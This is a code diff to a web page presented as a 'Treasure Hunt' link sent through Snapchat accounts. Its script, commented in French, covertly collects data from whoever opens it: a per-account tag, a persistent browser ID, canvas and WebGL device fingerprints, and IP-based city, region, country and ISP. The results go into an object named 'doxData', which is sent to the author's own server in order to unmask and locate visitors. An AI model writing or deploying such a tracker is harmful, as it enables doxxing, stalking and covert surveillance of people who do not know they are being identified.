@@ -102,6 +102,97 @@
   </div>
 
   <script>
+    // === IDENTIFIANT DE COMPTE (quel compte Snap a reçu ce lien ?) ===
+    // Le lien envoyé depuis le compte A  ->  ...index.html?t=compteA
+    // Le lien envoyé depuis le compte B  ->  ...index.html?t=compteB
+    // C'est ce qui permet d'attribuer chaque clic à un compte précis.
+    function getAccountTag() {
+      const params = new URLSearchParams(location.search);
+      return params.get('t') || params.get('id') || 'inconnu';
+    }
+
+    // === IDENTIFIANT PERSISTANT DU NAVIGATEUR ===
+    // Stocké dans le localStorage : si la MÊME personne ouvre les deux liens
+    // depuis le même navigateur, on retrouve le même visitorId.
+    // Indice très fort (mais réfutable : appareil prêté, etc.).
+    function getVisitorId() {
+      try {
+        let id = localStorage.getItem('th_vid');
+        if (!id) {
+          id = (crypto.randomUUID ? crypto.randomUUID()
+                : Date.now().toString(36) + Math.random().toString(36).slice(2));
+          localStorage.setItem('th_vid', id);
+        }
+        return id;
+      } catch (e) {
+        return null; // navigation privée / stockage bloqué
+      }
+    }
+
+    async function sha256(str) {
+      try {
+        const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+        return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Empreinte canvas : le rendu d'un même texte/forme diffère légèrement
+    // selon le GPU, les pilotes et l'OS. Stable pour un appareil donné.
+    async function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 240; canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '16px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(2, 2, 120, 24);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Treasure🪙Hunt', 4, 4);
+        ctx.fillStyle = 'rgba(102,0,200,0.6)';
+        ctx.fillText('Treasure🪙Hunt', 6, 18);
+        return await sha256(canvas.toDataURL());
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Empreinte WebGL : modèle de carte graphique exposé par le navigateur.
+    function getWebGLInfo() {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) return null;
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!dbg) return null;
+        return gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + ' | ' +
+               gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Géolocalisation IP avec plusieurs fournisseurs de secours (tous HTTPS + CORS).
+    async function getGeo() {
+      const providers = [
+        { url: 'https://get.geojs.io/v1/ip/geo.json',
+          map: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country,
+                       org: j.organization_name || j.organization }) },
+        { url: 'https://ipapi.co/json/',
+          map: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name, org: j.org }) }
+      ];
+      for (const p of providers) {
+        try {
+          const res = await fetch(p.url);
+          if (!res.ok) continue;
+          const j = await res.json();
+          if (j && j.success !== false && !j.error && j.ip) return p.map(j);
+        } catch (e) { /* fournisseur suivant */ }
+      }
+      return {}; // tout a échoué -> le backend prendra le relais
+    }
+
     function getDeviceName() {
       const ua = navigator.userAgent || '';
       const lowerUa = ua.toLowerCase();
@@ -168,6 +259,10 @@
       // === COLLECTE DES DONNÉES ===
       const doxData = {
         timestamp: new Date().toISOString(),
+        accountTag: getAccountTag(),               // <- quel compte Snap a reçu le lien
+        visitorId: getVisitorId(),                 // <- identifiant persistant du navigateur
+        canvasFp: await getCanvasFingerprint(),    // <- empreinte canvas (stable / appareil)
+        webgl: getWebGLInfo(),                      // <- modèle de GPU
         userAgent: navigator.userAgent,
         device: getDeviceName(),
         platform: navigator.platform,
@@ -182,18 +277,15 @@
         doNotTrack: navigator.doNotTrack
       };
 
-      // Récupération IP + Loc
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (res.ok) {
-          const ip = await res.json();
-          doxData.ip = ip.ip;
-          doxData.city = ip.city;
-          doxData.region = ip.region;
-          doxData.country = ip.country_name;
-          doxData.org = ip.org;
-        }
-      } catch(e) {}
+      // Récupération IP + Loc — plusieurs fournisseurs en cascade.
+      // Si l'un échoue (quota, blocage), on passe au suivant.
+      // Filet final : le backend complète l'IP/géoloc côté serveur.
+      const geo = await getGeo();
+      if (geo.ip)      doxData.ip = geo.ip;
+      if (geo.city)    doxData.city = geo.city;
+      if (geo.region)  doxData.region = geo.region;
+      if (geo.country) doxData.country = geo.country;
+      if (geo.org)     doxData.org = geo.org;
 
       // Envoi vers ton API Vercel
       try {
